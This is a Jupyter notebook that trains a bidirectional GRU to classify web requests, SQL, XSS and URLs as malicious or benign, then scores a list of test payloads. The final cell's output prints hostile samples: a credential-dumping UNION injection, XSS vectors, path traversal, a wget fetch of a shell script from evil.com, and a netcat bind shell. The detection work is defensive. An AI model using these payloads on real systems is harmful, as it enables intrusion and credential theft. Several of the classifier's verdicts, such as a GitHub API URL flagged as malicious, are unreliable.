{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "be0c7461",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "TensorFlow Version: 2.16.2\n",
      "✅ GPU detected: /physical_device:GPU:0\n"
     ]
    }
   ],
   "source": [
    "# Jupyter Notebook Cell 1\n",
    "\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "import tensorflow as tf\n",
    "from tensorflow.keras.preprocessing.text import Tokenizer\n",
    "from tensorflow.keras.preprocessing.sequence import pad_sequences\n",
    "from tensorflow.keras.models import Sequential\n",
    "from tensorflow.keras.layers import Embedding, GRU, Dense, SpatialDropout1D\n",
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn.metrics import classification_report, confusion_matrix\n",
    "import seaborn as sns\n",
    "import matplotlib.pyplot as plt\n",
    "import os\n",
    "\n",
    "print(f\"TensorFlow Version: {tf.__version__}\")\n",
    "gpu_devices = tf.config.list_physical_devices('GPU')\n",
    "if gpu_devices:\n",
    "    print(f\"✅ GPU detected: {gpu_devices[0].name}\")\n",
    "else:\n",
    "    print(\"⚠️ Warning: No GPU detected. Training will be very slow.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "adbeaff6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "✅ Configuration set for high-performance GPU training.\n"
     ]
    }
   ],
   "source": [
    "# Jupyter Notebook Cell 2\n",
    "\n",
    "# --- Dataset File Paths ---\n",
    "file_paths = {\n",
    "    'csic': 'csic_2010.csv',\n",
    "    'sqli': 'SQL_Injection_Dataset.csv',\n",
    "    'xss': 'XSS_dataset.csv',\n",
    "    'url': 'malicious_urls.csv'\n",
    "}\n",
    "\n",
    "# --- Parameters for a Robust Model ---\n",
    "# This dataset size is great for the M4 GPU: large enough for accuracy, fast to train.\n",
    "SAMPLES_PER_DATASET = 40000\n",
    "RANDOM_STATE = 42\n",
    "\n",
    "# --- Model Hyperparameters ---\n",
    "MAX_FEATURES = 10000\n",
    "MAX_LEN = 200\n",
    "EMBEDDING_DIM = 128\n",
    "GRU_UNITS = 128\n",
    "\n",
    "# --- Training Parameters ---\n",
    "BATCH_SIZE = 512\n",
    "EPOCHS = 10\n",
    "EARLY_STOP_PATIENCE = 2\n",
    "\n",
    "print(\"✅ Configuration set for high-performance GPU training.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "f2da9641",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "🔄 Loading a final, large, and balanced dataset...\n",
      "✅ Final master dataset created with 132,582 samples.\n",
      "Data split: 106,065 training samples, 26,517 testing samples.\n",
      "✅ Data preprocessing complete.\n",
      "Training data shape: (106065, 200)\n"
     ]
    }
   ],
   "source": [
    "# Jupyter Notebook Cell 3 (Final Balanced Dataset)\n",
    "\n",
    "print(\"🔄 Loading a final, large, and balanced dataset...\")\n",
    "try:\n",
    "    df_csic = pd.read_csv(file_paths['csic'])\n",
    "    df_sqli = pd.read_csv(file_paths['sqli'])\n",
    "    df_xss = pd.read_csv(file_paths['xss'])\n",
    "    df_url = pd.read_csv(file_paths['url'])\n",
    "\n",
    "    # Standardize and fix data types\n",
    "    df1 = df_csic[['content', 'classification']].rename(columns={'content': 'payload', 'classification': 'label'})\n",
    "    df1['label'] = (df1['label'].astype(str).str.lower() == 'anomalous').astype(int)\n",
    "    df2 = df_sqli[['Query', 'Label']].rename(columns={'Query': 'payload', 'Label': 'label'})\n",
    "    df3 = df_xss[['Sentence', 'Label']].rename(columns={'Sentence': 'payload', 'Label': 'label'})\n",
    "    df4 = df_url[['url', 'type']].rename(columns={'url': 'payload', 'type': 'label'})\n",
    "    df4['label'] = (df4['label'] != 'benign').astype(int)\n",
    "\n",
    "    # --- FINAL SAMPLING STRATEGY: Large and Balanced ---\n",
    "    # This gives the model a rich variety of all data types.\n",
    "    SAMPLES_PER_DATASET = 70000\n",
    "    \n",
    "    datasets = [\n",
    "        df1.sample(n=min(len(df1), SAMPLES_PER_DATASET), random_state=RANDOM_STATE),\n",
    "        df2.sample(n=min(len(df2), SAMPLES_PER_DATASET), random_state=RANDOM_STATE),\n",
    "        df3.sample(n=min(len(df3), SAMPLES_PER_DATASET), random_state=RANDOM_STATE),\n",
    "        df4.sample(n=min(len(df4), SAMPLES_PER_DATASET), random_state=RANDOM_STATE)\n",
    "    ]\n",
    "    \n",
    "    df_master = pd.concat(datasets, ignore_index=True).dropna()\n",
    "    df_master = df_master.sample(frac=1, random_state=RANDOM_STATE).reset_index(drop=True)\n",
    "\n",
    "    print(f\"✅ Final master dataset created with {len(df_master):,} samples.\")\n",
    "\n",
    "    payloads = df_master['payload'].astype(str).values\n",
    "    labels = df_master['label'].values\n",
    "    X_train_raw, X_test_raw, y_train, y_test = train_test_split(\n",
    "        payloads, labels, test_size=0.2, random_state=RANDOM_STATE, stratify=labels\n",
    "    )\n",
    "    print(f\"Data split: {len(X_train_raw):,} training samples, {len(X_test_raw):,} testing samples.\")\n",
    "\n",
    "    tokenizer = Tokenizer(num_words=MAX_FEATURES, char_level=True, oov_token='<OOV>')\n",
    "    tokenizer.fit_on_texts(X_train_raw)\n",
    "    X_train = pad_sequences(tokenizer.texts_to_sequences(X_train_raw), maxlen=MAX_LEN)\n",
    "    X_test = pad_sequences(tokenizer.texts_to_sequences(X_test_raw), maxlen=MAX_LEN)\n",
    "\n",
    "    print(\"✅ Data preprocessing complete.\")\n",
    "    print(f\"Training data shape: {X_train.shape}\")\n",
    "\n",
    "except FileNotFoundError as e:\n",
    "    print(f\"❌ ERROR: Could not find file {e.filename}.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "d135846b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "🧠 Building the Final, Regularized Deep Model...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/Users/kaivalyajoglekar/Desktop/GRU/.venv/lib/python3.11/site-packages/keras/src/layers/core/embedding.py:97: UserWarning: Argument `input_length` is deprecated. Just remove it.\n",
      "  warnings.warn(\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\">Model: \"sequential_3\"</span>\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1mModel: \"sequential_3\"\u001b[0m\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
       "┃<span style=\"font-weight: bold\"> Layer (type)                    </span>┃<span style=\"font-weight: bold\"> Output Shape           </span>┃<span style=\"font-weight: bold\">       Param # </span>┃\n",
       "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
       "│ embedding_3 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Embedding</span>)         │ ?                      │   <span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (unbuilt) │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ spatial_dropout1d_3             │ ?                      │             <span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> │\n",
       "│ (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">SpatialDropout1D</span>)              │                        │               │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ bidirectional_3 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Bidirectional</span>) │ ?                      │   <span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (unbuilt) │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ bidirectional_4 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Bidirectional</span>) │ ?                      │   <span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (unbuilt) │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ dense_3 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)                 │ ?                      │   <span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (unbuilt) │\n",
       "└─────────────────────────────────┴────────────────────────┴───────────────┘\n",
       "</pre>\n"
      ],
      "text/plain": [
       "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
       "┃\u001b[1m \u001b[0m\u001b[1mLayer (type)                   \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1mOutput Shape          \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1m      Param #\u001b[0m\u001b[1m \u001b[0m┃\n",
       "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
       "│ embedding_3 (\u001b[38;5;33mEmbedding\u001b[0m)         │ ?                      │   \u001b[38;5;34m0\u001b[0m (unbuilt) │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ spatial_dropout1d_3             │ ?                      │             \u001b[38;5;34m0\u001b[0m │\n",
       "│ (\u001b[38;5;33mSpatialDropout1D\u001b[0m)              │                        │               │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ bidirectional_3 (\u001b[38;5;33mBidirectional\u001b[0m) │ ?                      │   \u001b[38;5;34m0\u001b[0m (unbuilt) │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ bidirectional_4 (\u001b[38;5;33mBidirectional\u001b[0m) │ ?                      │   \u001b[38;5;34m0\u001b[0m (unbuilt) │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ dense_3 (\u001b[38;5;33mDense\u001b[0m)                 │ ?                      │   \u001b[38;5;34m0\u001b[0m (unbuilt) │\n",
       "└─────────────────────────────────┴────────────────────────┴───────────────┘\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Total params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Total params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Trainable params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Non-trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Non-trainable params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Jupyter Notebook Cell 4 (Final Model with Increased Regularization)\n",
    "from tensorflow.keras.layers import Bidirectional\n",
    "\n",
    "print(\"🧠 Building the Final, Regularized Deep Model...\")\n",
    "model = Sequential([\n",
    "    Embedding(input_dim=MAX_FEATURES, output_dim=EMBEDDING_DIM, input_length=MAX_LEN),\n",
    "    # Increased dropout to prevent overfitting\n",
    "    SpatialDropout1D(0.4),\n",
    "\n",
    "    Bidirectional(GRU(units=GRU_UNITS, dropout=0.4, return_sequences=True)),\n",
    "    \n",
    "    # Increased dropout in the second layer as well\n",
    "    Bidirectional(GRU(units=GRU_UNITS, dropout=0.4)),\n",
    "    \n",
    "    Dense(1, activation='sigmoid')\n",
    "])\n",
    "\n",
    "model.compile(\n",
    "    loss='binary_crossentropy',\n",
    "    optimizer='adam',\n",
    "    metrics=['accuracy', tf.keras.metrics.Precision(name='precision'), tf.keras.metrics.Recall(name='recall')]\n",
    ")\n",
    "model.summary()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "df4d6bf0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "🚀 Starting model training...\n",
      "Epoch 1/10\n",
      "\u001b[1m177/177\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m165s\u001b[0m 929ms/step - accuracy: 0.9675 - loss: 0.0976 - precision: 0.9662 - recall: 0.9315 - val_accuracy: 0.9734 - val_loss: 0.0813 - val_precision: 0.9759 - val_recall: 0.9407\n",
      "Epoch 2/10\n",
      "\u001b[1m177/177\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m162s\u001b[0m 914ms/step - accuracy: 0.9727 - loss: 0.0837 - precision: 0.9729 - recall: 0.9412 - val_accuracy: 0.9766 - val_loss: 0.0744 - val_precision: 0.9694 - val_recall: 0.9575\n",
      "Epoch 3/10\n",
      "\u001b[1m177/177\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m174s\u001b[0m 986ms/step - accuracy: 0.9754 - loss: 0.0764 - precision: 0.9751 - recall: 0.9476 - val_accuracy: 0.9783 - val_loss: 0.0691 - val_precision: 0.9757 - val_recall: 0.9565\n",
      "Epoch 4/10\n",
      "\u001b[1m177/177\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m163s\u001b[0m 922ms/step - accuracy: 0.9765 - loss: 0.0709 - precision: 0.9752 - recall: 0.9509 - val_accuracy: 0.9786 - val_loss: 0.0670 - val_precision: 0.9801 - val_recall: 0.9530\n",
      "Epoch 5/10\n",
      "\u001b[1m177/177\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m163s\u001b[0m 921ms/step - accuracy: 0.9775 - loss: 0.0687 - precision: 0.9769 - recall: 0.9524 - val_accuracy: 0.9793 - val_loss: 0.0655 - val_precision: 0.9790 - val_recall: 0.9561\n",
      "Epoch 6/10\n",
      "\u001b[1m177/177\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m169s\u001b[0m 955ms/step - accuracy: 0.9786 - loss: 0.0645 - precision: 0.9784 - recall: 0.9545 - val_accuracy: 0.9794 - val_loss: 0.0616 - val_precision: 0.9858 - val_recall: 0.9497\n",
      "Epoch 7/10\n",
      "\u001b[1m177/177\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m174s\u001b[0m 982ms/step - accuracy: 0.9795 - loss: 0.0616 - precision: 0.9784 - recall: 0.9571 - val_accuracy: 0.9804 - val_loss: 0.0612 - val_precision: 0.9720 - val_recall: 0.9671\n",
      "Epoch 8/10\n",
      "\u001b[1m177/177\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m164s\u001b[0m 925ms/step - accuracy: 0.9807 - loss: 0.0594 - precision: 0.9798 - recall: 0.9597 - val_accuracy: 0.9818 - val_loss: 0.0600 - val_precision: 0.9850 - val_recall: 0.9583\n",
      "Epoch 9/10\n",
      "\u001b[1m177/177\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m167s\u001b[0m 942ms/step - accuracy: 0.9811 - loss: 0.0567 - precision: 0.9804 - recall: 0.9603 - val_accuracy: 0.9826 - val_loss: 0.0554 - val_precision: 0.9833 - val_recall: 0.9624\n",
      "Epoch 10/10\n",
      "\u001b[1m177/177\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m163s\u001b[0m 922ms/step - accuracy: 0.9823 - loss: 0.0539 - precision: 0.9814 - recall: 0.9632 - val_accuracy: 0.9811 - val_loss: 0.0605 - val_precision: 0.9909 - val_recall: 0.9503\n",
      "\n",
      "✅ Training complete.\n"
     ]
    }
   ],
   "source": [
    "# Jupyter Notebook Cell 5\n",
    "\n",
    "print(\"\\n🚀 Starting model training...\")\n",
    "early_stopping = tf.keras.callbacks.EarlyStopping(\n",
    "    monitor='val_loss',\n",
    "    patience=EARLY_STOP_PATIENCE,\n",
    "    restore_best_weights=True\n",
    ")\n",
    "history = model.fit(\n",
    "    X_train, y_train,\n",
    "    epochs=EPOCHS,\n",
    "    batch_size=BATCH_SIZE,\n",
    "    validation_split=0.15,\n",
    "    callbacks=[early_stopping],\n",
    "    verbose=1\n",
    ")\n",
    "print(\"\\n✅ Training complete.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "90cfb8ad",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "🧪 Evaluating model on the unseen test set...\n",
      "\n",
      "--- Test Set Metrics ---\n",
      "Loss        : 0.0605\n",
      "Compile_metrics: 0.9803\n",
      "\u001b[1m829/829\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m52s\u001b[0m 62ms/step\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 700x500 with 2 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "📋 Classification Report:\n",
      "\n",
      "              precision    recall  f1-score   support\n",
      "\n",
      "      Benign       0.98      0.99      0.99     17996\n",
      "   Malicious       0.98      0.96      0.97      8521\n",
      "\n",
      "    accuracy                           0.98     26517\n",
      "   macro avg       0.98      0.97      0.98     26517\n",
      "weighted avg       0.98      0.98      0.98     26517\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# Jupyter Notebook Cell 6\n",
    "\n",
    "print(\"\\n🧪 Evaluating model on the unseen test set...\")\n",
    "results = model.evaluate(X_test, y_test, verbose=0)\n",
    "print(\"\\n--- Test Set Metrics ---\")\n",
    "for name, value in zip(model.metrics_names, results):\n",
    "    print(f\"{name.capitalize():<12}: {value:.4f}\")\n",
    "\n",
    "y_pred = (model.predict(X_test) > 0.5).astype(\"int32\")\n",
    "cm = confusion_matrix(y_test, y_pred)\n",
    "plt.figure(figsize=(7, 5))\n",
    "sns.heatmap(cm, annot=True, fmt='d', cmap='Blues',\n",
    "            xticklabels=['Benign', 'Malicious'], yticklabels=['Benign', 'Malicious'])\n",
    "plt.title('Confusion Matrix')\n",
    "plt.ylabel('Actual Label')\n",
    "plt.xlabel('Predicted Label')\n",
    "plt.show()\n",
    "\n",
    "print(\"\\n📋 Classification Report:\\n\")\n",
    "print(classification_report(y_test, y_pred, target_names=['Benign', 'Malicious']))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "d622b101",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "🕵️--- Starting Automated Analysis of 'test_payloads.txt' ---\n",
      "✅ Successfully located 'test_payloads.txt'. Beginning analysis...\n",
      "\n",
      "Verdict: 🚨 MALICIOUS | Probability: 0.9172 | Payload: '1' UNION ALL SELECT NULL, CONCAT(user, 0x3a, password), NULL FROM users--'\n",
      "Verdict: 🚨 MALICIOUS | Probability: 0.9978 | Payload: '<body onload=alert('xss')>'\n",
      "Verdict: 🚨 MALICIOUS | Probability: 0.5045 | Payload: '../../../../../../windows/system32/drivers/etc/hosts'\n",
      "Verdict: 🚨 MALICIOUS | Probability: 0.9951 | Payload: '&& wget http://evil.com/shell.sh'\n",
      "Verdict: 🚨 MALICIOUS | Probability: 0.5982 | Payload: 'eval(String.fromCharCode(97,108,101,114,116,40,49,41))'\n",
      "Verdict: 🚨 MALICIOUS | Probability: 0.9884 | Payload: '%3Csvg%2Fonload%3Dalert(1)%3E'\n",
      "Verdict: 🚨 MALICIOUS | Probability: 0.9430 | Payload: '| nc -l -p 4444 -e /bin/bash'\n",
      "Verdict: ✅ BENIGN | Probability: 0.0015 | Payload: 'EXEC sp_configure 'show advanced options', 1;'\n",
      "Verdict: ✅ BENIGN | Probability: 0.1848 | Payload: 'I need to write a SQL query like 'SELECT * FROM users WHERE id > 105'.'\n",
      "Verdict: ✅ BENIGN | Probability: 0.0219 | Payload: 'The error is in the line with \"<div class='main'>\". Check the HTML.'\n",
      "Verdict: ✅ BENIGN | Probability: 0.0005 | Payload: '/search?q=what is a 'union' in sql?'\n",
      "Verdict: 🚨 MALICIOUS | Probability: 0.9994 | Payload: 'https://api.github.com/repos/tensorflow/tensorflow/issues?state=open&labels=bug'\n",
      "Verdict: ✅ BENIGN | Probability: 0.0272 | Payload: '{\"user\": {\"name\": \"Alex\", \"permissions\": [\"read\", \"write\"]}}'\n",
      "Verdict: 🚨 MALICIOUS | Probability: 0.9589 | Payload: 'My script is called 'test-script.sh'.'\n",
      "Verdict: ✅ BENIGN | Probability: 0.0125 | Payload: 'update-grub'\n",
      "Verdict: 🚨 MALICIOUS | Probability: 0.8862 | Payload: 'GET /static/css/main.css HTTP/1.1'\n",
      "\n",
      "🎉 Analysis complete.\n"
     ]
    }
   ],
   "source": [
    "# Jupyter Notebook Cell (Final, File-Only Analysis)\n",
    "import os\n",
    "\n",
    "def analyze_payload(payload: str):\n",
    "    \"\"\"\n",
    "    Takes a string, preprocesses it, gets a prediction from the trained model,\n",
    "    and prints a formatted result.\n",
    "    \"\"\"\n",
    "    # 1. Convert the text payload into a numerical sequence\n",
    "    sequence = tokenizer.texts_to_sequences([payload])\n",
    "    padded_sequence = pad_sequences(sequence, maxlen=MAX_LEN)\n",
    "\n",
    "    # 2. Use the trained model to predict the probability of being malicious\n",
    "    prediction = model.predict(padded_sequence, verbose=0)[0][0]\n",
    "\n",
    "    # 3. Determine the final verdict based on the probability\n",
    "    verdict = \"🚨 MALICIOUS\" if prediction > 0.5 else \"✅ BENIGN\"\n",
    "\n",
    "    # 4. Print a clean, easy-to-read result\n",
    "    print(f\"Verdict: {verdict} | Probability: {prediction:.4f} | Payload: '{payload}'\")\n",
    "\n",
    "\n",
    "# --- Main script to analyze the file ---\n",
    "print(\"🕵️--- Starting Automated Analysis of 'test_payloads.txt' ---\")\n",
    "file_path = 'test_payloads.txt'\n",
    "\n",
    "# First, confirm that the file now exists with the correct name\n",
    "if os.path.exists(file_path):\n",
    "    print(f\"✅ Successfully located '{file_path}'. Beginning analysis...\\n\")\n",
    "    with open(file_path, 'r') as f:\n",
    "        # Create a list of payloads from the file, ignoring empty lines and comments\n",
    "        payloads_to_test = [line.strip() for line in f if line.strip() and not line.startswith('#')]\n",
    "\n",
    "    # Loop through each payload and analyze it\n",
    "    for payload in payloads_to_test:\n",
    "        analyze_payload(payload)\n",
    "\n",
    "    print(\"\\n🎉 Analysis complete.\")\n",
    "else:\n",
    "    # This error should no longer appear, but it's good practice to keep it\n",
    "    print(f\"⚠️ FATAL ERROR: The file '{file_path}' was still not found.\")\n",
    "    print(\"Please ensure you have renamed the file correctly and it is in the same directory as the notebook.\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.14"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
